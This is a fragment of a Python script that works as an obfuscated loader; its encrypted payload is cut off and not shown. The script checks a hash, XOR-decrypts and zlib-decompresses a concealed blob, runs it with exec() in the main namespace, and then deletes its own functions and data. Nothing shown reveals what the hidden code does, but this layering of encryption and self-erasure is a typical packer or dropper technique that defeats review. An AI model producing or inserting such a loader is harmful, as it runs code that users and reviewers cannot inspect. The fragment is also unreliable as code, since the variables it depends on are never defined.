_cz_VuET7iwSzNM + _clgOnTcrJ1MMaC + _cc07GKMHS5ofA2 + _ckRa3vs4lW92cs + _ceo0v7I4Dj1vrD + _cxUDDUv1P8MGVy + _cg38gw6enEe0vB + _chyG6jTcJ_cgc7 + _cbqCodYP0BewHI + _cw4CMy_CXBx_eu + _cmoNPgHvH54ulg + _cjLlxZ_DyywJVu + _cyeMgsNVrzExkY + _cmNKeAw64SUptX + _ciCegkGNoI_wyW + _cnqqrzAEEZX9f4 + _cfuD8bLtx6GE3J + _ciHt8OgOENxczn + _cevDiAAVFSK8JX + _clhYluUl5Z71_D + _czTINMsrNO7AL0 + _czSNXa18c44eBh + _ccbtcZ2U6PYmOL + _cwEMmio1Lonf58 + _cfUra6yKheg8lZ + _ci21SswMuOjHG3 + _cdtJszEP6VBE4o + _ckq9e_GHr8s0ou + _cnb5A28kAD9P1p + _cszFOmNd1kOeHr + _cpQ_iVJG7CTo1A + _ck5DZ4m8OmcR1E + _cyDQ_EkizfsPH1 + _ckDHFwY25IhygE + _cvHSBIYZge7aPF + _cllCHKyliaXgbK + _ckKNDbbt7dz2Fi + _cv6HKaQY0JhkJS + _cbJ1AF2OiZL63K + _ccBOUJonAToj9R + _c_X4zihrNe7Xqt + _cjbebAMvsASpWi + _cbiKflZL4iXqaC + _caSS_et_3stgYd + _cib0g4B2tf0zGR + _ccU7O4oFmp3FHF + _c_w6V9aCDeeZsi + _cmwiR0ZPrYOmWe + _cwBoWMhV7D0pHD + _c_Zvu2CAswXf6P + _cz8zXUFZf35agn + _cyPiECcoI36OcZ + _c_qYTMa44a0jOV + _ce1V09nyIhgOyM + _cgXAF4DKcS13oq + _cvLsaH6pRByqDe + _cds8Rfgz0URdM0 + _c_NyVKMXG4tRSR + _cuA3BlMA1ewkXt + _cyNws_0rxr2QuH + _cjMrFLzoQxmLMa + _cv4Faio9_56p27 + _ctNitVnd3sXMs6 + _cq8vqzNwSI7pGe + _cjqEtoGl6vU_wQ + _cms5qKQmPSiCo1 + _cbgOcrYf7GpBfo + _cdz_p4oCFUy6om + _caR96QSr3Dxo88 + _cyrEb1XwXS1Wh2 + _czmUJDOEHRRVLc + _czJsrmdJmoYfFR + _cwOiSNXfnp6wZc + _cdtVfL4iSPV1JI + _cffBbCT3bmiuc0 + _clBKF83nsih4Fn + _cjGHlhTlI51du9 + _cjohQQLXlqkri2 + _cj72iSDbVea8Af + _chJpfgMPLRDYTn + _coyniRQhwPXBMs + _chn6i9UjzTF_E0 + _ciN1wXgEJ0TvFB + _cyObKuCKSPlqbq + _ci16RBoI6q3rQD + _canE5Q06qwSLST + _czNdZ4eue86DC1 + _cn9WdTAtBMKlC_ + _cgv6mBOJnaMjCT + _csFCXGr3o2gQd8 + _cmf7RyNjgqUWJu + _cl3VhLATO7GKUq + _cdjr1OEQDPmD3n + _cvO4GP6sJinie9 + _cyLqe6kEthcTq8 + _cdUvWZsi_gKIFg + _csjPPYCQegjtQx + _ctwkP205Rn2Qo6 + _cvLeoT2wGkJpya + _chYXQqkqFs983L + _clEwKrTv23ugNf + _cxVRdswOvqjMjf + _cnfC1TubyFdP8w + _css90gGDVpWaag + _csi2vJ9DvKNqWm + _cmqEmdTNv_Z66k + _cg3N7DgGiItUhA + _cyHfDrooAMJPRo + _cahhINMnylHhtk + _czMfC4HXiHxwzf + _cdeELEmAQJKsw8 + _cfxwmBgL1_NGuU + _cxbwUf0x17VPoJ + _czpyTBXOgQxU52 + _cu6ZaG7e5YXy3U + _cgSUCmffqIikR4 + _ccf5VNlMY_9RNH + _ceyt3jfbD20IgM + _cjI2dVJbrpTnvQ + _cuL1nHHS9my5Rx + _chIs_wNobZJq9l + _ck7UPDOrE_7K25 + _cl63yzwz4JV2iH + _ciuSSEhOGNS7Lu)
if __import__('hashlib').sha256(_pde7wZ85VgrpQq).hexdigest() != '924a28654d0ad27744e4aeee6e3c93e95174dd556ca930a6689f6ff7ef6302e5':
    __import__('sys').exit(1)
_xwOxJaABW6pyu5 = bytes([180, 63, 175, 175, 49, 129, 111, 6, 88, 110, 189, 210, 209, 116, 155, 147, 46, 15, 66, 178, 182, 250, 242, 225, 136, 108, 245, 51, 16])
_fkeVwcHH9uZ5T8i = bytes([201, 70, 31, 8, 211, 131, 29, 4, 115, 177, 128, 95, 143, 85, 184, 105, 145, 45, 20, 53, 43, 5, 226, 63, 174, 120, 109, 216, 68])

def _fxvojSWoh5iOh0F(_bjFIs1odCNqzdJ, _kxtXEZPb2nRdod):
    return bytes(_bjFIs1odCNqzdJ[_ie8jce1fWDM6Qx] ^ _kxtXEZPb2nRdod[_ie8jce1fWDM6Qx % len(_kxtXEZPb2nRdod)] for _ie8jce1fWDM6Qx in range(len(_bjFIs1odCNqzdJ)))

def _fdbXDlrPJZK3Ica(_thFyJHbcLaQ8wS):
    import zlib
    return zlib.decompress(_thFyJHbcLaQ8wS) # Un seul niveau de zlib ici pour simplifier

def _feonOqcnyTFzRvj():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xvj5zR0brH0N1D = _fxvojSWoh5iOh0F(_pde7wZ85VgrpQq, _xwOxJaABW6pyu5)
    # 2. Décompression Zlib
    _dguIeKJM7iCllT = _fdbXDlrPJZK3Ica(_xvj5zR0brH0N1D)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dguIeKJM7iCllT.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nccJGowUPZHZ01 = _main.__dict__
    _nccJGowUPZHZ01.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nccJGowUPZHZ01)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feonOqcnyTFzRvj()
try:
    del _fxvojSWoh5iOh0F, _fdbXDlrPJZK3Ica, _feonOqcnyTFzRvj
    del _pde7wZ85VgrpQq, _xwOxJaABW6pyu5, _fkeVwcHH9uZ5T8i
except:
    pass
